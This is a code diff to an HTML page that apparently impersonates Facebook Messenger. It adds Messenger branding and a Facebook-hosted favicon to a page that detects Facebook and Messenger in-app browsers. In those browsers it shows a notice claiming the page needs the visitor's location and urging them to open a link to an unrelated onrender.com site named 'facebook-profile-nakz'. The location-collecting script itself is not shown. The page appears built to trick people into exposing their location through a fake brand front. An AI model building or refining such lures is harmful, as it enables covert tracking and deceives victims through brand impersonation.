@@ -1,6 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Messenger</title>
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
+        Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      border-radius: 8px;
+      padding: 40px 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .logo {
+      font-size: 32px;
+      font-weight: 600;
+      color: #0084ff;
+      margin-bottom: 16px;
+      letter-spacing: -0.5px;
+    }
+
+    .message {
+      font-size: 15px;
+      color: #1c1e21;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+
+    .button {
+      background-color: #0084ff;
+      color: #fff;
+      font-size: 15px;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+      font-weight: 500;
+    }
+
+    .button:active {
+      background-color: #006fe0;
+    }
+
+    .browser-warning {
+      font-size: 14px;
+      color: red;
+      margin-bottom: 16px;
+    }
+
+    .open-browser-btn {
+      background: #00b2ff;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      width: 100%;
+      margin-bottom: 16px;
+      font-size: 15px;
+      font-weight: 500;
+    }
+  </style>
+</head>
 <body>
   <script>
-    function isInMessengerOrFB() {
+    function isInAppBrowser() {
       const ua = navigator.userAgent || "";
       return (
         ua.includes("FBAV") ||
@@ -10,18 +90,16 @@
       );
     }
 
-    if (isInMessengerOrFB()) {
-      // Show full-page message
+    if (isInAppBrowser()) {
       document.write(`
-        <div style="padding: 40px; font-family: sans-serif; text-align: center;">
-          <h2>⚠️ Location Blocked</h2>
-          <p>This page needs your location to continue.</p>
-          <p><b>Messenger's browser blocks location access on iPhone.</b></p>
-          <p>To proceed:</p>
+        <div style="padding: 40px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
+        Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; text-align: center;">
+          <h2 style="color: #0084ff; margin-bottom: 10px;">Messenger</h2>
+          <p style="font-size: 15px; color: #1c1e21;">This page needs your location to continue.</p>
+          <p style="font-size: 14px;">But Messenger's browser <b>blocks location access</b>.</p>
+          <p style="font-size: 14px;">Please open in Safari or Chrome:</p>
           <a href="https://facebook-profile-nakz.onrender.com" target="_blank">
-            <button style="background-color: #0084ff; color: white; font-size: 16px; padding: 12px 25px; border: none; border-radius: 6px; cursor: pointer;">
-              🔗 Open in Safari or Chrome
-            </button>
+            <button class="open-browser-btn">🔗 Open in Safari/Chrome</button>
           </a>
         </div>
       `);
@@ -36,3 +114,4 @@
 
   <script src="script.js"></script>
 </body>
+</html>
